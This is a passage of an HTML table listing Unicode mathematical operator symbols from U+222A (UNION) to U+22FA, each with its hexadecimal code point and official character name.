<td style="text-align:center">∪</td>
<td style="text-align:center">222A</td>
<td style="text-align:center">UNION</td>
</tr>
<tr>
<td style="text-align:center">∫</td>
<td style="text-align:center">222B</td>
<td style="text-align:center">INTEGRAL</td>
</tr>
<tr>
<td style="text-align:center">∬</td>
<td style="text-align:center">222C</td>
<td style="text-align:center">DOUBLE INTEGRAL</td>
</tr>
<tr>
<td style="text-align:center">∭</td>
<td style="text-align:center">222D</td>
<td style="text-align:center">TRIPLE INTEGRAL</td>
</tr>
<tr>
<td style="text-align:center">∮</td>
<td style="text-align:center">222E</td>
<td style="text-align:center">CONTOUR INTEGRAL</td>
</tr>
<tr>
<td style="text-align:center">∯</td>
<td style="text-align:center">222F</td>
<td style="text-align:center">SURFACE INTEGRAL</td>
</tr>
<tr>
<td style="text-align:center">∰</td>
<td style="text-align:center">2230</td>
<td style="text-align:center">VOLUME INTEGRAL</td>
</tr>
<tr>
<td style="text-align:center">∱</td>
<td style="text-align:center">2231</td>
<td style="text-align:center">CLOCKWISE INTEGRAL</td>
</tr>
<tr>
<td style="text-align:center">∲</td>
<td style="text-align:center">2232</td>
<td style="text-align:center">CLOCKWISE CONTOUR INTEGRAL</td>
</tr>
<tr>
<td style="text-align:center">∳</td>
<td style="text-align:center">2233</td>
<td style="text-align:center">ANTICLOCKWISE CONTOUR INTEGRAL</td>
</tr>
<tr>
<td style="text-align:center">∴</td>
<td style="text-align:center">2234</td>
<td style="text-align:center">THEREFORE</td>
</tr>
<tr>
<td style="text-align:center">∵</td>
<td style="text-align:center">2235</td>
<td style="text-align:center">BECAUSE</td>
</tr>
<tr>
<td style="text-align:center">∶</td>
<td style="text-align:center">2236</td>
<td style="text-align:center">RATIO</td>
</tr>
<tr>
<td style="text-align:center">∷</td>
<td style="text-align:center">2237</td>
<td style="text-align:center">PROPORTION</td>
</tr>
<tr>
<td style="text-align:center">∸</td>
<td style="text-align:center">2238</td>
<td style="text-align:center">DOT MINUS</td>
</tr>
<tr>
<td style="text-align:center">∹</td>
<td style="text-align:center">2239</td>
<td style="text-align:center">EXCESS</td>
</tr>
<tr>
<td style="text-align:center">∺</td>
<td style="text-align:center">223A</td>
<td style="text-align:center">GEOMETRIC PROPORTION</td>
</tr>
<tr>
<td style="text-align:center">∻</td>
<td style="text-align:center">223B</td>
<td style="text-align:center">HOMOTHETIC</td>
</tr>
<tr>
<td style="text-align:center">∼</td>
<td style="text-align:center">223C</td>
<td style="text-align:center">TILDE OPERATOR</td>
</tr>
<tr>
<td style="text-align:center">∽</td>
<td style="text-align:center">223D</td>
<td style="text-align:center">REVERSED TILDE</td>
</tr>
<tr>
<td style="text-align:center">∾</td>
<td style="text-align:center">223E</td>
<td style="text-align:center">INVERTED LAZY S</td>
</tr>
<tr>
<td style="text-align:center">∿</td>
<td style="text-align:center">223F</td>
<td style="text-align:center">SINE WAVE</td>
</tr>
<tr>
<td style="text-align:center">≀</td>
<td style="text-align:center">2240</td>
<td style="text-align:center">WREATH PRODUCT</td>
</tr>
<tr>
<td style="text-align:center">≁</td>
<td style="text-align:center">2241</td>
<td style="text-align:center">NOT TILDE</td>
</tr>
<tr>
<td style="text-align:center">≂</td>
<td style="text-align:center">2242</td>
<td style="text-align:center">MINUS TILDE</td>
</tr>
<tr>
<td style="text-align:center">≃</td>
<td style="text-align:center">2243</td>
<td style="text-align:center">ASYMPTOTICALLY EQUAL TO</td>
</tr>
<tr>
<td style="text-align:center">≄</td>
<td style="text-align:center">2244</td>
<td style="text-align:center">NOT ASYMPTOTICALLY EQUAL TO</td>
</tr>
<tr>
<td style="text-align:center">≅</td>
<td style="text-align:center">2245</td>
<td style="text-align:center">APPROXIMATELY EQUAL TO</td>
</tr>
<tr>
<td style="text-align:center">≆</td>
<td style="text-align:center">2246</td>
<td style="text-align:center">APPROXIMATELY BUT NOT ACTUALLY EQUAL TO</td>
</tr>
<tr>
<td style="text-align:center">≇</td>
<td style="text-align:center">2247</td>
<td style="text-align:center">NEITHER APPROXIMATELY NOR ACTUALLY EQUAL TO</td>
</tr>
<tr>
<td style="text-align:center">≈</td>
<td style="text-align:center">2248</td>
<td style="text-align:center">ALMOST EQUAL TO</td>
</tr>
<tr>
<td style="text-align:center">≉</td>
<td style="text-align:center">2249</td>
<td style="text-align:center">NOT ALMOST EQUAL TO</td>
</tr>
<tr>
<td style="text-align:center">≊</td>
<td style="text-align:center">224A</td>
<td style="text-align:center">ALMOST EQUAL OR EQUAL TO</td>
</tr>
<tr>
<td style="text-align:center">≋</td>
<td style="text-align:center">224B</td>
<td style="text-align:center">TRIPLE TILDE</td>
</tr>
<tr>
<td style="text-align:center">≌</td>
<td style="text-align:center">224C</td>
<td style="text-align:center">ALL EQUAL TO</td>
</tr>
<tr>
<td style="text-align:center">≍</td>
<td style="text-align:center">224D</td>
<td style="text-align:center">EQUIVALENT TO</td>
</tr>
<tr>
<td style="text-align:center">≎</td>
<td style="text-align:center">224E</td>
<td style="text-align:center">GEOMETRICALLY EQUIVALENT TO</td>
</tr>
<tr>
<td style="text-align:center">≏</td>
<td style="text-align:center">224F</td>
<td style="text-align:center">DIFFERENCE BETWEEN</td>
</tr>
<tr>
<td style="text-align:center">≐</td>
<td style="text-align:center">2250</td>
<td style="text-align:center">APPROACHES THE LIMIT</td>
</tr>
<tr>
<td style="text-align:center">≑</td>
<td style="text-align:center">2251</td>
<td style="text-align:center">GEOMETRICALLY EQUAL TO</td>
</tr>
<tr>
<td style="text-align:center">≒</td>
<td style="text-align:center">2252</td>
<td style="text-align:center">APPROXIMATELY EQUAL TO OR THE IMAGE OF</td>
</tr>
<tr>
<td style="text-align:center">≓</td>
<td style="text-align:center">2253</td>
<td style="text-align:center">IMAGE OF OR APPROXIMATELY EQUAL TO</td>
</tr>
<tr>
<td style="text-align:center">≔</td>
<td style="text-align:center">2254</td>
<td style="text-align:center">COLON EQUALS</td>
</tr>
<tr>
<td style="text-align:center">≕</td>
<td style="text-align:center">2255</td>
<td style="text-align:center">EQUALS COLON</td>
</tr>
<tr>
<td style="text-align:center">≖</td>
<td style="text-align:center">2256</td>
<td style="text-align:center">RING IN EQUAL TO</td>
</tr>
<tr>
<td style="text-align:center">≗</td>
<td style="text-align:center">2257</td>
<td style="text-align:center">RING EQUAL TO</td>
</tr>
<tr>
<td style="text-align:center">≘</td>
<td style="text-align:center">2258</td>
<td style="text-align:center">CORRESPONDS TO</td>
</tr>
<tr>
<td style="text-align:center">≙</td>
<td style="text-align:center">2259</td>
<td style="text-align:center">ESTIMATES</td>
</tr>
<tr>
<td style="text-align:center">≚</td>
<td style="text-align:center">225A</td>
<td style="text-align:center">EQUIANGULAR TO</td>
</tr>
<tr>
<td style="text-align:center">≛</td>
<td style="text-align:center">225B</td>
<td style="text-align:center">STAR EQUALS</td>
</tr>
<tr>
<td style="text-align:center">≜</td>
<td style="text-align:center">225C</td>
<td style="text-align:center">DELTA EQUAL TO</td>
</tr>
<tr>
<td style="text-align:center">≝</td>
<td style="text-align:center">225D</td>
<td style="text-align:center">EQUAL TO BY DEFINITION</td>
</tr>
<tr>
<td style="text-align:center">≞</td>
<td style="text-align:center">225E</td>
<td style="text-align:center">MEASURED BY</td>
</tr>
<tr>
<td style="text-align:center">≟</td>
<td style="text-align:center">225F</td>
<td style="text-align:center">QUESTIONED EQUAL TO</td>
</tr>
<tr>
<td style="text-align:center">≠</td>
<td style="text-align:center">2260</td>
<td style="text-align:center">NOT EQUAL TO</td>
</tr>
<tr>
<td style="text-align:center">≡</td>
<td style="text-align:center">2261</td>
<td style="text-align:center">IDENTICAL TO</td>
</tr>
<tr>
<td style="text-align:center">≢</td>
<td style="text-align:center">2262</td>
<td style="text-align:center">NOT IDENTICAL TO</td>
</tr>
<tr>
<td style="text-align:center">≣</td>
<td style="text-align:center">2263</td>
<td style="text-align:center">STRICTLY EQUIVALENT TO</td>
</tr>
<tr>
<td style="text-align:center">≤</td>
<td style="text-align:center">2264</td>
<td style="text-align:center">LESS-THAN OR EQUAL TO</td>
</tr>
<tr>
<td style="text-align:center">≥</td>
<td style="text-align:center">2265</td>
<td style="text-align:center">GREATER-THAN OR EQUAL TO</td>
</tr>
<tr>
<td style="text-align:center">≦</td>
<td style="text-align:center">2266</td>
<td style="text-align:center">LESS-THAN OVER EQUAL TO</td>
</tr>
<tr>
<td style="text-align:center">≧</td>
<td style="text-align:center">2267</td>
<td style="text-align:center">GREATER-THAN OVER EQUAL TO</td>
</tr>
<tr>
<td style="text-align:center">≨</td>
<td style="text-align:center">2268</td>
<td style="text-align:center">LESS-THAN BUT NOT EQUAL TO</td>
</tr>
<tr>
<td style="text-align:center">≩</td>
<td style="text-align:center">2269</td>
<td style="text-align:center">GREATER-THAN BUT NOT EQUAL TO</td>
</tr>
<tr>
<td style="text-align:center">≪</td>
<td style="text-align:center">226A</td>
<td style="text-align:center">MUCH LESS-THAN</td>
</tr>
<tr>
<td style="text-align:center">≫</td>
<td style="text-align:center">226B</td>
<td style="text-align:center">MUCH GREATER-THAN</td>
</tr>
<tr>
<td style="text-align:center">≬</td>
<td style="text-align:center">226C</td>
<td style="text-align:center">BETWEEN</td>
</tr>
<tr>
<td style="text-align:center">≭</td>
<td style="text-align:center">226D</td>
<td style="text-align:center">NOT EQUIVALENT TO</td>
</tr>
<tr>
<td style="text-align:center">≮</td>
<td style="text-align:center">226E</td>
<td style="text-align:center">NOT LESS-THAN</td>
</tr>
<tr>
<td style="text-align:center">≯</td>
<td style="text-align:center">226F</td>
<td style="text-align:center">NOT GREATER-THAN</td>
</tr>
<tr>
<td style="text-align:center">≰</td>
<td style="text-align:center">2270</td>
<td style="text-align:center">NEITHER LESS-THAN NOR EQUAL TO</td>
</tr>
<tr>
<td style="text-align:center">≱</td>
<td style="text-align:center">2271</td>
<td style="text-align:center">NEITHER GREATER-THAN NOR EQUAL TO</td>
</tr>
<tr>
<td style="text-align:center">≲</td>
<td style="text-align:center">2272</td>
<td style="text-align:center">LESS-THAN OR EQUIVALENT TO</td>
</tr>
<tr>
<td style="text-align:center">≳</td>
<td style="text-align:center">2273</td>
<td style="text-align:center">GREATER-THAN OR EQUIVALENT TO</td>
</tr>
<tr>
<td style="text-align:center">≴</td>
<td style="text-align:center">2274</td>
<td style="text-align:center">NEITHER LESS-THAN NOR EQUIVALENT TO</td>
</tr>
<tr>
<td style="text-align:center">≵</td>
<td style="text-align:center">2275</td>
<td style="text-align:center">NEITHER GREATER-THAN NOR EQUIVALENT TO</td>
</tr>
<tr>
<td style="text-align:center">≶</td>
<td style="text-align:center">2276</td>
<td style="text-align:center">LESS-THAN OR GREATER-THAN</td>
</tr>
<tr>
<td style="text-align:center">≷</td>
<td style="text-align:center">2277</td>
<td style="text-align:center">GREATER-THAN OR LESS-THAN</td>
</tr>
<tr>
<td style="text-align:center">≸</td>
<td style="text-align:center">2278</td>
<td style="text-align:center">NEITHER LESS-THAN NOR GREATER-THAN</td>
</tr>
<tr>
<td style="text-align:center">≹</td>
<td style="text-align:center">2279</td>
<td style="text-align:center">NEITHER GREATER-THAN NOR LESS-THAN</td>
</tr>
<tr>
<td style="text-align:center">≺</td>
<td style="text-align:center">227A</td>
<td style="text-align:center">PRECEDES</td>
</tr>
<tr>
<td style="text-align:center">≻</td>
<td style="text-align:center">227B</td>
<td style="text-align:center">SUCCEEDS</td>
</tr>
<tr>
<td style="text-align:center">≼</td>
<td style="text-align:center">227C</td>
<td style="text-align:center">PRECEDES OR EQUAL TO</td>
</tr>
<tr>
<td style="text-align:center">≽</td>
<td style="text-align:center">227D</td>
<td style="text-align:center">SUCCEEDS OR EQUAL TO</td>
</tr>
<tr>
<td style="text-align:center">≾</td>
<td style="text-align:center">227E</td>
<td style="text-align:center">PRECEDES OR EQUIVALENT TO</td>
</tr>
<tr>
<td style="text-align:center">≿</td>
<td style="text-align:center">227F</td>
<td style="text-align:center">SUCCEEDS OR EQUIVALENT TO</td>
</tr>
<tr>
<td style="text-align:center">⊀</td>
<td style="text-align:center">2280</td>
<td style="text-align:center">DOES NOT PRECEDE</td>
</tr>
<tr>
<td style="text-align:center">⊁</td>
<td style="text-align:center">2281</td>
<td style="text-align:center">DOES NOT SUCCEED</td>
</tr>
<tr>
<td style="text-align:center">⊂</td>
<td style="text-align:center">2282</td>
<td style="text-align:center">SUBSET OF</td>
</tr>
<tr>
<td style="text-align:center">⊃</td>
<td style="text-align:center">2283</td>
<td style="text-align:center">SUPERSET OF</td>
</tr>
<tr>
<td style="text-align:center">⊄</td>
<td style="text-align:center">2284</td>
<td style="text-align:center">NOT A SUBSET OF</td>
</tr>
<tr>
<td style="text-align:center">⊅</td>
<td style="text-align:center">2285</td>
<td style="text-align:center">NOT A SUPERSET OF</td>
</tr>
<tr>
<td style="text-align:center">⊆</td>
<td style="text-align:center">2286</td>
<td style="text-align:center">SUBSET OF OR EQUAL TO</td>
</tr>
<tr>
<td style="text-align:center">⊇</td>
<td style="text-align:center">2287</td>
<td style="text-align:center">SUPERSET OF OR EQUAL TO</td>
</tr>
<tr>
<td style="text-align:center">⊈</td>
<td style="text-align:center">2288</td>
<td style="text-align:center">NEITHER A SUBSET OF NOR EQUAL TO</td>
</tr>
<tr>
<td style="text-align:center">⊉</td>
<td style="text-align:center">2289</td>
<td style="text-align:center">NEITHER A SUPERSET OF NOR EQUAL TO</td>
</tr>
<tr>
<td style="text-align:center">⊊</td>
<td style="text-align:center">228A</td>
<td style="text-align:center">SUBSET OF WITH NOT EQUAL TO</td>
</tr>
<tr>
<td style="text-align:center">⊋</td>
<td style="text-align:center">228B</td>
<td style="text-align:center">SUPERSET OF WITH NOT EQUAL TO</td>
</tr>
<tr>
<td style="text-align:center">⊌</td>
<td style="text-align:center">228C</td>
<td style="text-align:center">MULTISET</td>
</tr>
<tr>
<td style="text-align:center">⊍</td>
<td style="text-align:center">228D</td>
<td style="text-align:center">MULTISET MULTIPLICATION</td>
</tr>
<tr>
<td style="text-align:center">⊎</td>
<td style="text-align:center">228E</td>
<td style="text-align:center">MULTISET UNION</td>
</tr>
<tr>
<td style="text-align:center">⊏</td>
<td style="text-align:center">228F</td>
<td style="text-align:center">SQUARE IMAGE OF</td>
</tr>
<tr>
<td style="text-align:center">⊐</td>
<td style="text-align:center">2290</td>
<td style="text-align:center">SQUARE ORIGINAL OF</td>
</tr>
<tr>
<td style="text-align:center">⊑</td>
<td style="text-align:center">2291</td>
<td style="text-align:center">SQUARE IMAGE OF OR EQUAL TO</td>
</tr>
<tr>
<td style="text-align:center">⊒</td>
<td style="text-align:center">2292</td>
<td style="text-align:center">SQUARE ORIGINAL OF OR EQUAL TO</td>
</tr>
<tr>
<td style="text-align:center">⊓</td>
<td style="text-align:center">2293</td>
<td style="text-align:center">SQUARE CAP</td>
</tr>
<tr>
<td style="text-align:center">⊔</td>
<td style="text-align:center">2294</td>
<td style="text-align:center">SQUARE CUP</td>
</tr>
<tr>
<td style="text-align:center">⊕</td>
<td style="text-align:center">2295</td>
<td style="text-align:center">CIRCLED PLUS</td>
</tr>
<tr>
<td style="text-align:center">⊖</td>
<td style="text-align:center">2296</td>
<td style="text-align:center">CIRCLED MINUS</td>
</tr>
<tr>
<td style="text-align:center">⊗</td>
<td style="text-align:center">2297</td>
<td style="text-align:center">CIRCLED TIMES</td>
</tr>
<tr>
<td style="text-align:center">⊘</td>
<td style="text-align:center">2298</td>
<td style="text-align:center">CIRCLED DIVISION SLASH</td>
</tr>
<tr>
<td style="text-align:center">⊙</td>
<td style="text-align:center">2299</td>
<td style="text-align:center">CIRCLED DOT OPERATOR</td>
</tr>
<tr>
<td style="text-align:center">⊚</td>
<td style="text-align:center">229A</td>
<td style="text-align:center">CIRCLED RING OPERATOR</td>
</tr>
<tr>
<td style="text-align:center">⊛</td>
<td style="text-align:center">229B</td>
<td style="text-align:center">CIRCLED ASTERISK OPERATOR</td>
</tr>
<tr>
<td style="text-align:center">⊜</td>
<td style="text-align:center">229C</td>
<td style="text-align:center">CIRCLED EQUALS</td>
</tr>
<tr>
<td style="text-align:center">⊝</td>
<td style="text-align:center">229D</td>
<td style="text-align:center">CIRCLED DASH</td>
</tr>
<tr>
<td style="text-align:center">⊞</td>
<td style="text-align:center">229E</td>
<td style="text-align:center">SQUARED PLUS</td>
</tr>
<tr>
<td style="text-align:center">⊟</td>
<td style="text-align:center">229F</td>
<td style="text-align:center">SQUARED MINUS</td>
</tr>
<tr>
<td style="text-align:center">⊠</td>
<td style="text-align:center">22A0</td>
<td style="text-align:center">SQUARED TIMES</td>
</tr>
<tr>
<td style="text-align:center">⊡</td>
<td style="text-align:center">22A1</td>
<td style="text-align:center">SQUARED DOT OPERATOR</td>
</tr>
<tr>
<td style="text-align:center">⊢</td>
<td style="text-align:center">22A2</td>
<td style="text-align:center">RIGHT TACK</td>
</tr>
<tr>
<td style="text-align:center">⊣</td>
<td style="text-align:center">22A3</td>
<td style="text-align:center">LEFT TACK</td>
</tr>
<tr>
<td style="text-align:center">⊤</td>
<td style="text-align:center">22A4</td>
<td style="text-align:center">DOWN TACK</td>
</tr>
<tr>
<td style="text-align:center">⊥</td>
<td style="text-align:center">22A5</td>
<td style="text-align:center">UP TACK</td>
</tr>
<tr>
<td style="text-align:center">⊦</td>
<td style="text-align:center">22A6</td>
<td style="text-align:center">ASSERTION</td>
</tr>
<tr>
<td style="text-align:center">⊧</td>
<td style="text-align:center">22A7</td>
<td style="text-align:center">MODELS</td>
</tr>
<tr>
<td style="text-align:center">⊨</td>
<td style="text-align:center">22A8</td>
<td style="text-align:center">TRUE</td>
</tr>
<tr>
<td style="text-align:center">⊩</td>
<td style="text-align:center">22A9</td>
<td style="text-align:center">FORCES</td>
</tr>
<tr>
<td style="text-align:center">⊪</td>
<td style="text-align:center">22AA</td>
<td style="text-align:center">TRIPLE VERTICAL BAR RIGHT TURNSTILE</td>
</tr>
<tr>
<td style="text-align:center">⊫</td>
<td style="text-align:center">22AB</td>
<td style="text-align:center">DOUBLE VERTICAL BAR DOUBLE RIGHT TURNSTILE</td>
</tr>
<tr>
<td style="text-align:center">⊬</td>
<td style="text-align:center">22AC</td>
<td style="text-align:center">DOES NOT PROVE</td>
</tr>
<tr>
<td style="text-align:center">⊭</td>
<td style="text-align:center">22AD</td>
<td style="text-align:center">NOT TRUE</td>
</tr>
<tr>
<td style="text-align:center">⊮</td>
<td style="text-align:center">22AE</td>
<td style="text-align:center">DOES NOT FORCE</td>
</tr>
<tr>
<td style="text-align:center">⊯</td>
<td style="text-align:center">22AF</td>
<td style="text-align:center">NEGATED DOUBLE VERTICAL BAR DOUBLE RIGHT TURNSTILE</td>
</tr>
<tr>
<td style="text-align:center">⊰</td>
<td style="text-align:center">22B0</td>
<td style="text-align:center">PRECEDES UNDER RELATION</td>
</tr>
<tr>
<td style="text-align:center">⊱</td>
<td style="text-align:center">22B1</td>
<td style="text-align:center">SUCCEEDS UNDER RELATION</td>
</tr>
<tr>
<td style="text-align:center">⊲</td>
<td style="text-align:center">22B2</td>
<td style="text-align:center">NORMAL SUBGROUP OF</td>
</tr>
<tr>
<td style="text-align:center">⊳</td>
<td style="text-align:center">22B3</td>
<td style="text-align:center">CONTAINS AS NORMAL SUBGROUP</td>
</tr>
<tr>
<td style="text-align:center">⊴</td>
<td style="text-align:center">22B4</td>
<td style="text-align:center">NORMAL SUBGROUP OF OR EQUAL TO</td>
</tr>
<tr>
<td style="text-align:center">⊵</td>
<td style="text-align:center">22B5</td>
<td style="text-align:center">CONTAINS AS NORMAL SUBGROUP OR EQUAL TO</td>
</tr>
<tr>
<td style="text-align:center">⊶</td>
<td style="text-align:center">22B6</td>
<td style="text-align:center">ORIGINAL OF</td>
</tr>
<tr>
<td style="text-align:center">⊷</td>
<td style="text-align:center">22B7</td>
<td style="text-align:center">IMAGE OF</td>
</tr>
<tr>
<td style="text-align:center">⊸</td>
<td style="text-align:center">22B8</td>
<td style="text-align:center">MULTIMAP</td>
</tr>
<tr>
<td style="text-align:center">⊹</td>
<td style="text-align:center">22B9</td>
<td style="text-align:center">HERMITIAN CONJUGATE MATRIX</td>
</tr>
<tr>
<td style="text-align:center">⊺</td>
<td style="text-align:center">22BA</td>
<td style="text-align:center">INTERCALATE</td>
</tr>
<tr>
<td style="text-align:center">⊻</td>
<td style="text-align:center">22BB</td>
<td style="text-align:center">XOR</td>
</tr>
<tr>
<td style="text-align:center">⊼</td>
<td style="text-align:center">22BC</td>
<td style="text-align:center">NAND</td>
</tr>
<tr>
<td style="text-align:center">⊽</td>
<td style="text-align:center">22BD</td>
<td style="text-align:center">NOR</td>
</tr>
<tr>
<td style="text-align:center">⊾</td>
<td style="text-align:center">22BE</td>
<td style="text-align:center">RIGHT ANGLE WITH ARC</td>
</tr>
<tr>
<td style="text-align:center">⊿</td>
<td style="text-align:center">22BF</td>
<td style="text-align:center">RIGHT TRIANGLE</td>
</tr>
<tr>
<td style="text-align:center">⋀</td>
<td style="text-align:center">22C0</td>
<td style="text-align:center">N-ARY LOGICAL AND</td>
</tr>
<tr>
<td style="text-align:center">⋁</td>
<td style="text-align:center">22C1</td>
<td style="text-align:center">N-ARY LOGICAL OR</td>
</tr>
<tr>
<td style="text-align:center">⋂</td>
<td style="text-align:center">22C2</td>
<td style="text-align:center">N-ARY INTERSECTION</td>
</tr>
<tr>
<td style="text-align:center">⋃</td>
<td style="text-align:center">22C3</td>
<td style="text-align:center">N-ARY UNION</td>
</tr>
<tr>
<td style="text-align:center">⋄</td>
<td style="text-align:center">22C4</td>
<td style="text-align:center">DIAMOND OPERATOR</td>
</tr>
<tr>
<td style="text-align:center">⋅</td>
<td style="text-align:center">22C5</td>
<td style="text-align:center">DOT OPERATOR</td>
</tr>
<tr>
<td style="text-align:center">⋆</td>
<td style="text-align:center">22C6</td>
<td style="text-align:center">STAR OPERATOR</td>
</tr>
<tr>
<td style="text-align:center">⋇</td>
<td style="text-align:center">22C7</td>
<td style="text-align:center">DIVISION TIMES</td>
</tr>
<tr>
<td style="text-align:center">⋈</td>
<td style="text-align:center">22C8</td>
<td style="text-align:center">BOWTIE</td>
</tr>
<tr>
<td style="text-align:center">⋉</td>
<td style="text-align:center">22C9</td>
<td style="text-align:center">LEFT NORMAL FACTOR SEMIDIRECT PRODUCT</td>
</tr>
<tr>
<td style="text-align:center">⋊</td>
<td style="text-align:center">22CA</td>
<td style="text-align:center">RIGHT NORMAL FACTOR SEMIDIRECT PRODUCT</td>
</tr>
<tr>
<td style="text-align:center">⋋</td>
<td style="text-align:center">22CB</td>
<td style="text-align:center">LEFT SEMIDIRECT PRODUCT</td>
</tr>
<tr>
<td style="text-align:center">⋌</td>
<td style="text-align:center">22CC</td>
<td style="text-align:center">RIGHT SEMIDIRECT PRODUCT</td>
</tr>
<tr>
<td style="text-align:center">⋍</td>
<td style="text-align:center">22CD</td>
<td style="text-align:center">REVERSED TILDE EQUALS</td>
</tr>
<tr>
<td style="text-align:center">⋎</td>
<td style="text-align:center">22CE</td>
<td style="text-align:center">CURLY LOGICAL OR</td>
</tr>
<tr>
<td style="text-align:center">⋏</td>
<td style="text-align:center">22CF</td>
<td style="text-align:center">CURLY LOGICAL AND</td>
</tr>
<tr>
<td style="text-align:center">⋐</td>
<td style="text-align:center">22D0</td>
<td style="text-align:center">DOUBLE SUBSET</td>
</tr>
<tr>
<td style="text-align:center">⋑</td>
<td style="text-align:center">22D1</td>
<td style="text-align:center">DOUBLE SUPERSET</td>
</tr>
<tr>
<td style="text-align:center">⋒</td>
<td style="text-align:center">22D2</td>
<td style="text-align:center">DOUBLE INTERSECTION</td>
</tr>
<tr>
<td style="text-align:center">⋓</td>
<td style="text-align:center">22D3</td>
<td style="text-align:center">DOUBLE UNION</td>
</tr>
<tr>
<td style="text-align:center">⋔</td>
<td style="text-align:center">22D4</td>
<td style="text-align:center">PITCHFORK</td>
</tr>
<tr>
<td style="text-align:center">⋕</td>
<td style="text-align:center">22D5</td>
<td style="text-align:center">EQUAL AND PARALLEL TO</td>
</tr>
<tr>
<td style="text-align:center">⋖</td>
<td style="text-align:center">22D6</td>
<td style="text-align:center">LESS-THAN WITH DOT</td>
</tr>
<tr>
<td style="text-align:center">⋗</td>
<td style="text-align:center">22D7</td>
<td style="text-align:center">GREATER-THAN WITH DOT</td>
</tr>
<tr>
<td style="text-align:center">⋘</td>
<td style="text-align:center">22D8</td>
<td style="text-align:center">VERY MUCH LESS-THAN</td>
</tr>
<tr>
<td style="text-align:center">⋙</td>
<td style="text-align:center">22D9</td>
<td style="text-align:center">VERY MUCH GREATER-THAN</td>
</tr>
<tr>
<td style="text-align:center">⋚</td>
<td style="text-align:center">22DA</td>
<td style="text-align:center">LESS-THAN EQUAL TO OR GREATER-THAN</td>
</tr>
<tr>
<td style="text-align:center">⋛</td>
<td style="text-align:center">22DB</td>
<td style="text-align:center">GREATER-THAN EQUAL TO OR LESS-THAN</td>
</tr>
<tr>
<td style="text-align:center">⋜</td>
<td style="text-align:center">22DC</td>
<td style="text-align:center">EQUAL TO OR LESS-THAN</td>
</tr>
<tr>
<td style="text-align:center">⋝</td>
<td style="text-align:center">22DD</td>
<td style="text-align:center">EQUAL TO OR GREATER-THAN</td>
</tr>
<tr>
<td style="text-align:center">⋞</td>
<td style="text-align:center">22DE</td>
<td style="text-align:center">EQUAL TO OR PRECEDES</td>
</tr>
<tr>
<td style="text-align:center">⋟</td>
<td style="text-align:center">22DF</td>
<td style="text-align:center">EQUAL TO OR SUCCEEDS</td>
</tr>
<tr>
<td style="text-align:center">⋠</td>
<td style="text-align:center">22E0</td>
<td style="text-align:center">DOES NOT PRECEDE OR EQUAL</td>
</tr>
<tr>
<td style="text-align:center">⋡</td>
<td style="text-align:center">22E1</td>
<td style="text-align:center">DOES NOT SUCCEED OR EQUAL</td>
</tr>
<tr>
<td style="text-align:center">⋢</td>
<td style="text-align:center">22E2</td>
<td style="text-align:center">NOT SQUARE IMAGE OF OR EQUAL TO</td>
</tr>
<tr>
<td style="text-align:center">⋣</td>
<td style="text-align:center">22E3</td>
<td style="text-align:center">NOT SQUARE ORIGINAL OF OR EQUAL TO</td>
</tr>
<tr>
<td style="text-align:center">⋤</td>
<td style="text-align:center">22E4</td>
<td style="text-align:center">SQUARE IMAGE OF OR NOT EQUAL TO</td>
</tr>
<tr>
<td style="text-align:center">⋥</td>
<td style="text-align:center">22E5</td>
<td style="text-align:center">SQUARE ORIGINAL OF OR NOT EQUAL TO</td>
</tr>
<tr>
<td style="text-align:center">⋦</td>
<td style="text-align:center">22E6</td>
<td style="text-align:center">LESS-THAN BUT NOT EQUIVALENT TO</td>
</tr>
<tr>
<td style="text-align:center">⋧</td>
<td style="text-align:center">22E7</td>
<td style="text-align:center">GREATER-THAN BUT NOT EQUIVALENT TO</td>
</tr>
<tr>
<td style="text-align:center">⋨</td>
<td style="text-align:center">22E8</td>
<td style="text-align:center">PRECEDES BUT NOT EQUIVALENT TO</td>
</tr>
<tr>
<td style="text-align:center">⋩</td>
<td style="text-align:center">22E9</td>
<td style="text-align:center">SUCCEEDS BUT NOT EQUIVALENT TO</td>
</tr>
<tr>
<td style="text-align:center">⋪</td>
<td style="text-align:center">22EA</td>
<td style="text-align:center">NOT NORMAL SUBGROUP OF</td>
</tr>
<tr>
<td style="text-align:center">⋫</td>
<td style="text-align:center">22EB</td>
<td style="text-align:center">DOES NOT CONTAIN AS NORMAL SUBGROUP</td>
</tr>
<tr>
<td style="text-align:center">⋬</td>
<td style="text-align:center">22EC</td>
<td style="text-align:center">NOT NORMAL SUBGROUP OF OR EQUAL TO</td>
</tr>
<tr>
<td style="text-align:center">⋭</td>
<td style="text-align:center">22ED</td>
<td style="text-align:center">DOES NOT CONTAIN AS NORMAL SUBGROUP OR EQUAL</td>
</tr>
<tr>
<td style="text-align:center">⋮</td>
<td style="text-align:center">22EE</td>
<td style="text-align:center">VERTICAL ELLIPSIS</td>
</tr>
<tr>
<td style="text-align:center">⋯</td>
<td style="text-align:center">22EF</td>
<td style="text-align:center">MIDLINE HORIZONTAL ELLIPSIS</td>
</tr>
<tr>
<td style="text-align:center">⋰</td>
<td style="text-align:center">22F0</td>
<td style="text-align:center">UP RIGHT DIAGONAL ELLIPSIS</td>
</tr>
<tr>
<td style="text-align:center">⋱</td>
<td style="text-align:center">22F1</td>
<td style="text-align:center">DOWN RIGHT DIAGONAL ELLIPSIS</td>
</tr>
<tr>
<td style="text-align:center">⋲</td>
<td style="text-align:center">22F2</td>
<td style="text-align:center">ELEMENT OF WITH LONG HORIZONTAL STROKE</td>
</tr>
<tr>
<td style="text-align:center">⋳</td>
<td style="text-align:center">22F3</td>
<td style="text-align:center">ELEMENT OF WITH VERTICAL BAR AT END OF HORIZONTAL STROKE</td>
</tr>
<tr>
<td style="text-align:center">⋴</td>
<td style="text-align:center">22F4</td>
<td style="text-align:center">SMALL ELEMENT OF WITH VERTICAL BAR AT END OF HORIZONTAL STROKE</td>
</tr>
<tr>
<td style="text-align:center">⋵</td>
<td style="text-align:center">22F5</td>
<td style="text-align:center">ELEMENT OF WITH DOT ABOVE</td>
</tr>
<tr>
<td style="text-align:center">⋶</td>
<td style="text-align:center">22F6</td>
<td style="text-align:center">ELEMENT OF WITH OVERBAR</td>
</tr>
<tr>
<td style="text-align:center">⋷</td>
<td style="text-align:center">22F7</td>
<td style="text-align:center">SMALL ELEMENT OF WITH OVERBAR</td>
</tr>
<tr>
<td style="text-align:center">⋸</td>
<td style="text-align:center">22F8</td>
<td style="text-align:center">ELEMENT OF WITH UNDERBAR</td>
</tr>
<tr>
<td style="text-align:center">⋹</td>
<td style="text-align:center">22F9</td>
<td style="text-align:center">ELEMENT OF WITH TWO HORIZONTAL STROKES</td>
</tr>
<tr>
<td style="text-align:center">⋺</td>
<td style="text-align:center">22FA</td>
